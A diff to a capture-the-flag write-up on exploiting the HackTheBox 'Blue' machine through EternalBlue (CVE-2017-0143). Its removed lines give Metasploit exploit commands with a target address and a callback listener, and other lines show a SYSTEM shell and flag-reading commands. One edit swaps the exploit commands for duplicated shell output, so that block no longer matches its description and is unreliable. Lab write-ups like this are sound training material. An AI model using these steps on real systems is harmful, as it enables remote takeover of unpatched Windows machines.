@@ -53,7 +53,7 @@ The scan confirmed:
 - **CVE:** CVE-2017-0143
 - **Risk Factor:** HIGH
 
-This is EternalBlue — a critical remote code execution vulnerability in Microsoft's SMBv1 implementation.
+This is EternalBlue, a critical remote code execution vulnerability in Microsoft's SMBv1 implementation.
 
 ---
 
@@ -78,13 +78,12 @@ The vulnerability exists in how SMBv1 handles certain requests, allowing an atta
 
 For this box, I used Metasploit's EternalBlue module:
 ```bash
-msfconsole
-```
-```
-use exploit/windows/smb/ms17_010_eternalblue
-set RHOSTS 10.129.4.126
-set LHOST 10.10.15.65
-run
+meterpreter > shell
+Process 2528 created.
+Channel 1 created.
+
+C:\Windows\system32>whoami
+nt authority\system
 ```
 
 ![Metasploit exploitation process](/images/htb-blue/blue_2.png)
@@ -103,10 +102,13 @@ The exploit:
 ### SYSTEM Access
 
 Once the exploit completed, I had a Meterpreter session. I dropped into a shell to verify access:
-```
+```bash
 meterpreter > shell
-```
-```
+Process 2528 created.
+Channel 1 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation. All rights reserved.
+
 C:\Windows\system32>whoami
 nt authority\system
 ```
@@ -120,14 +122,14 @@ nt authority\system
 ## Capturing the Flags
 
 ### User Flag
-```
+```bash
 cd C:\Users
 dir /s user.txt
 type C:\Users\haris\Desktop\user.txt
 ```
 
 ### Root Flag
-```
+```bash
 type C:\Users\Administrator\Desktop\root.txt
 ```
 
